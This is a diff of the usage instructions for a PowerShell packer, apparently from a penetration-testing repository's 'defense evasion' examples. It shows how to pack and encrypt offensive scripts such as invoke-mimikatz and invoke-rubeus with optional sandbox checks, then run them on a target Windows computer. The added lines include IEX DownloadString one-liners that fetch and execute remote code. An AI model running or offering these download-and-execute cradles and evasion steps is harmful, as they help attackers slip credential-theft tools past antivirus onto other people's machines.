@@ -13,22 +13,27 @@
     - wait for 60 seconds before execution
   
 #### USAGE
-  - Step 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
+  - STEP 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
 ```
-PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
-PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
---- or ---
-PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
-``` 
+[*] First load the packer
+    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');
+
+[*] Then "pack/obfuscate" a PowerShell script stored locally (with or without the sandbox checks enabled)
+    PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
+    --- or ---
+    PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
+
+[*] Or "pack/obfuscate" a PowerShell script stored on a remote web server (with or without the sandbox checks enabled)
+
+    PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
+    --- or ---
+    PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
 ```
-PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
-PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
---- or ---
-PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
-```
-  - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
+#### 
+  - STEP 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-script.ps1'); Invoke-method-of-your-original-script
+
 --- or (not recommended) ---
 PS C:\> WGET -URI https://URL/Packed-script.ps1 -OutFile C:\temp\Packed-script.ps1
 PS C:\> Import-Module C:\temp\Packed-script.ps1
